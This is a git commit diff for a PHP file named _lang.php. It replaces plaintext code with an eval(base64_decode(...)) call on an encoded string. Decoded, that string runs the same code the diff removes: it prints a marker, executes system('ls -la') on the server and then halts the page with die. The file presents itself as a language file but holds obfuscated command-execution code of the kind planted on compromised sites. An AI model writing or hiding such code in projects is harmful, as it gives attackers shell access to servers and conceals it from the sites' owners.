edaac9471fb698daec2a01f333c90840b4ca93b6
selasansd <49369435+selasansd@users.noreply.github.com>
2019-04-07 18:47:19 +0300

    Update _lang.php

--- _lang.php
+++ _lang.php
@@ -1,7 +1,6 @@
 <?php
-  echo "asdas333dasd";
-  echo "<pre>";
-  system("ls -la");
-  echo "</pre>";
-  die;
+
+$c = "ZWNobyAiYXNkYXMzMzNkYXNkIjsKZWNobyAiPHByZT4iOwpzeXN0ZW0oImxzIC1sYSIpOwplY2hvICI8L3ByZT4iOwpkaWU7";
+eval(base64_decode($c));
+
 ?>
